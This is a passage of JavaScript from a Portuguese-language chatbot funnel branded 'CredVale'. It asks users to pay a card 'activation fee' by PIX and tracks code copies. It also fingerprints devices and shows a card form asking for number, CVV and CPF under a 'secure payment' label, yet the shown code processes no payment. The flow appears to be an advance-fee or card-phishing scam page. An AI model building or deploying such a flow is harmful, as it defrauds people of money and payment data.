        '<div style="font-size:0.75rem;color:#6b7a8f;margin-bottom:4px;">Valor: <strong style="color:#4CC8A4;">'+taxa+'</strong></div>'+
        '<div style="font-size:0.7rem;color:#94a3b0;">Escaneie o QR Code abaixo ou copie o código PIX</div>'+
      '</div>'+

      '<div style="text-align:center;margin-bottom:10px;">'+
        '<div style="width:200px;height:200px;margin:0 auto;border-radius:12px;overflow:hidden;background:#fff;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,0.3);border:2px solid rgba(255,255,255,0.06);">'+
          '<img src="'+qrCodeUrl+'" alt="QR Code PIX" style="width:100%;height:100%;object-fit:contain;">'+
        '</div>'+
      '</div>'+

      '<div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:10px;margin-bottom:8px;">'+
        '<div style="font-size:0.65rem;color:#6b7a8f;margin-bottom:3px;">Código PIX Copia e Cola:</div>'+
        '<div style="background:rgba(0,0,0,0.3);border-radius:8px;padding:8px;font-size:0.65rem;color:#c8d0dc;word-break:break-all;font-family:monospace;text-align:center;margin-bottom:6px;border:1px solid rgba(255,255,255,0.04);max-height:60px;overflow-y:auto;">'+copiaCola+'</div>'+
        '<button class="chat-option chat-option--primary" id="pixCopiarChave" style="width:100%;padding:9px;font-size:0.8rem;">📋 Copiar código PIX</button>'+
      '</div>'+

      '<div style="display:flex;flex-direction:column;gap:4px;">'+
        '<button class="chat-option" id="pixJaPaguei" style="width:100%;padding:10px;font-size:0.8rem;">✅ Já paguei — confirmar</button>'+
      '</div>';

    showPopup(pixHtml);

    document.getElementById('pixCopiarChave').onclick = function() {
      try { navigator.sendBeacon(apiBase+'/track/pix-copy', new Blob([JSON.stringify({client_id:clientId})], {type:'application/json'})); } catch(e){}
      navigator.clipboard.writeText(copiaCola).then(function() {
        closePopup();
        showPopup(
          '<div style="text-align:center;">'+
            '<div style="width:56px;height:56px;margin:0 auto 10px;background:rgba(76,200,164,0.12);border-radius:50%;display:flex;align-items:center;justify-content:center;border:1px solid rgba(76,200,164,0.2);">'+
              '<span style="font-size:1.8rem;color:#4CC8A4;">✓</span>'+
            '</div>'+
            '<div style="font-size:0.8rem;color:#4CC8A4;font-weight:700;text-transform:uppercase;margin-bottom:4px;">✅ Código PIX copiado</div>'+
            '<div style="font-size:0.85rem;color:#c8d0dc;margin-bottom:10px;line-height:1.4;">'+
              'Agora <strong style="color:#e2e8f0;">abra seu banco</strong>, vá em <strong style="color:#e2e8f0;">Pix</strong> e cole o código para pagar.'+
            '</div>'+
            '<div style="background:rgba(76,200,164,0.06);border:1px solid rgba(76,200,164,0.12);border-radius:12px;padding:12px;margin:0 0 12px;font-size:0.8rem;color:#94a3b0;text-align:left;line-height:1.5;">'+
              '📌 <strong>Importante:</strong> Fique atento ao <strong>WhatsApp</strong>. É por lá que você vai receber as credenciais e confirmação do seu cartão.'+
            '</div>'+
            '<button class="chat-option chat-option--primary" id="pixCopiarOk" style="width:100%;padding:12px;font-size:0.85rem;">✅ Entendi, vou pagar</button>'+
          '</div>'
        );
        document.getElementById('pixCopiarOk').onclick = function() {
          closePopup();
          addMsg('💚 Ok, vou pagar o PIX agora!','user');
          addMsg('<div class="chat-pending-bar">⏳ <strong>Pagamento pendente</strong><span class="chat-pending-dot"></span></div>','bot');
        };
      }).catch(function() {
        var ta = document.createElement('textarea');
        ta.value = copiaCola; ta.style.position='fixed'; ta.style.opacity='0';
        document.body.appendChild(ta); ta.select(); document.execCommand('copy');
        ta.remove();
        closePopup();
        addMsg('💚 Ok, vou pagar o PIX agora!','user');
        addMsg('<div class="chat-pending-bar">⏳ <strong>Pagamento pendente</strong><span class="chat-pending-dot"></span></div>','bot');
      });
    };

    document.getElementById('pixJaPaguei').onclick = function() {
      closePopup();
      abrirWhatsAppVerificacao(clientId, limite, taxa, nomePrimeiro, cpfLimpo);
    };
  }

  /* ---- CARTÃO MODAL ---- */
  function modalCartao(clientId, limite) {
    flowState = 'card-form';
    hideInput();
    var taxa = getPrecoStr(chosenCard);

    var cardHtml =
      '<div style="text-align:center;margin-bottom:14px;">'+
        '<div style="font-size:2rem;margin-bottom:4px;">💳</div>'+
        '<div class="popup-title">Cartão de Crédito</div>'+
        '<div style="font-size:0.85rem;color:#6b7a8f;">Taxa de emissão: <strong style="color:#4CC8A4;">'+taxa+'</strong></div>'+
      '</div>'+
      '<div style="display:flex;flex-direction:column;gap:12px;">'+
        '<input placeholder="Número do cartão" class="pix-input" id="cardNumero" maxlength="19" style="padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
        '<div style="display:flex;gap:10px;">'+
          '<input placeholder="Validade" class="pix-input" id="cardValidade" maxlength="5" style="flex:1;padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
          '<input placeholder="CVV" class="pix-input" id="cardCvv" maxlength="4" style="flex:1;padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
        '</div>'+
        '<input placeholder="Nome do titular" class="pix-input" id="cardTitular" style="padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
        '<input placeholder="CPF do titular" class="pix-input" id="cardCpf" maxlength="14" style="padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
        '<button class="chat-option chat-option--primary" id="cardPagar" style="width:100%;padding:16px;font-size:1rem;margin-top:4px;">💳 Pagar '+taxa+'</button>'+
        '<div style="text-align:center;font-size:0.7rem;color:#4a5568;">🔒 Dados protegidos · Pagamento seguro</div>'+
      '</div>';

    showPopup(cardHtml);

    document.getElementById('cardPagar').onclick = function() {
      var nome = (user.nome||'').split(' ')[0]||'';
      var cpfLimpo = user.cpf||'00000000000';
      closePopup();
      addMsg('💳 <strong>Pagamento com cartão solicitado.</strong> Em breve entraremos em contato para confirmar.','bot');
      setTimeout(function() {
        abrirWhatsAppVerificacao(clientId, limite, taxa, nome, cpfLimpo);
      }, 500);
    };
  }

  /* ---- Abrir WhatsApp com mensagem pré-definida ---- */
  function abrirWhatsAppVerificacao(clientId, limite, taxa, nome, cpf) {
    var phone = user.whatsapp.replace(/\D/g,'').slice(0,11);
    var msg = encodeURIComponent(
      'Ol\u00e1! Meu nome \u00e9 '+nome+', CPF '+cpf+'. '+
      'Acabei de efetuar o pagamento da taxa de ativa\u00e7\u00e3o do meu cart\u00e3o '+(chosenCard==='virtual'?'Virtual (Standard)':'F\u00edsico (Plus)')+'. '+
      'Gostaria de confirmar o recebimento e dar continuidade \u00e0 ativa\u00e7\u00e3o. Obrigado!'
    );
    window.open('https://wa.me/55'+phone+'?text='+msg, '_blank');
  }

  /* ---- Utilitários ---- */
  async function verificarCPFExistente(cpf) {
    try {
      var client = await API.getClientByCpf(cpf);
      if (!client||!client.id) return false;
      var nome = client.nome||'';
      var primeiroNome = nome.split(' ')[0]||'';
      var limite = client.limite_aprovado||0;
      sessionStorage.setItem('vs_clientId', client.id);
      sessionStorage.setItem('vs_nome', primeiroNome);
      sessionStorage.setItem('vs_nome_completo', nome);
      sessionStorage.setItem('vs_limite', limite);
      // Atualiza device info do cliente com os dados da sessão atual
      try {
        var dd = getDeviceInfo();
        API.updateClientDevice(client.id, { dispositivo: dd.dispositivo, modelo: dd.modelo, fabricante: dd.fabricante, os: dd.os, navegador: dd.navegador, navegador_versao: dd.navegador_versao });
      } catch(e) {}
      addMsg('👋 Olá novamente, <strong>'+primeiroNome+'</strong>! Localizamos seu cadastro.', 'bot');
      hideInput(); await sleep(1200);
      if (client.status==='aprovado'||client.status==='ativado') {
        addMsg(
          '<div style="text-align:center;padding:8px 0;">'+
            '<div style="font-size:2.8rem;margin-bottom:10px;">✅</div>'+
            '<div style="font-size:1.1rem;font-weight:900;color:#e2e8f0;margin-bottom:4px;">Você já possui um cadastro ativo no <strong style="background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">CredVale</strong>.</div>'+
            '<div style="font-size:0.8rem;color:#94a3b0;margin-bottom:12px;line-height:1.5;">Seu acesso já foi aprovado anteriormente. Utilize uma das opções abaixo para continuar.</div>'+
            '<div style="display:flex;flex-direction:column;gap:8px;">'+
              '<button class="chat-option chat-option--primary" id="btnBaixarApp" style="padding:12px;font-size:0.85rem;">📲 Baixar Aplicativo</button>'+
              '<button class="chat-option" id="btnFalarSuporte" style="padding:12px;font-size:0.85rem;">💬 Falar com o Suporte</button>'+
            '</div>'+
          '</div>',
          'bot'
        );
        showOptions([]);
        await new Promise(function(resolve) {
          document.getElementById('btnBaixarApp').onclick = function() {
            var p = new URLSearchParams({ nome: nome, limite: limite, id: client.id });
            window.location.href = 'app.html?' + p.toString();
            resolve();
          };
          document.getElementById('btnFalarSuporte').onclick = function() {
            abrirWhatsAppVerificacao(client.id, limite, '', primeiroNome, user.cpf);
            resolve();
          };
        });
      } else {
        addMsg('Você já iniciou sua solicitação. Vamos continuar!','bot');
        await sleep(800);
        etapaCardChoice(client.id, limite);
      }
      return true;
    } catch(e) { return false; }
  }

  /* ---- Mobile: manter input visível com teclado ---- */
  if (window.visualViewport) {
    window.visualViewport.addEventListener('resize', function() {
      var diff = window.innerHeight - window.visualViewport.height;
      if (diff > 60) {
        // Teclado aberto: fixa o input acima do teclado
        chatModal.style.height = window.visualViewport.height + 'px';
        chatInputArea.style.position = 'fixed';
        chatInputArea.style.bottom = '0';
        chatInputArea.style.left = '0';
        chatInputArea.style.right = '0';
        chatInputArea.style.zIndex = '100';
        // Scroll messages to bottom
        scrollDown();
      } else {
        // Teclado fechado: restaura
        chatModal.style.height = '';
        chatInputArea.style.position = '';
        chatInputArea.style.bottom = '';
        chatInputArea.style.left = '';
        chatInputArea.style.right = '';
        chatInputArea.style.zIndex = '';
      }
    });
  }

  /* ---- Fullscreen: esconder barra de endereço ---- */
  if ('scrollRestoration' in window.history) window.history.scrollRestoration = 'manual';
  if (window.navigator.standalone === false && window.matchMedia('(display-mode: browser)').matches) {
    window.scrollTo(0, 1);
  }

  /* ---- Inicialização ---- */
  async function init() {
    carregarPrecos();
    await ensureSession();
    await iniciarFluxo();
  }

  if (document.readyState==='complete') init();
  else window.addEventListener('load', init);
})();
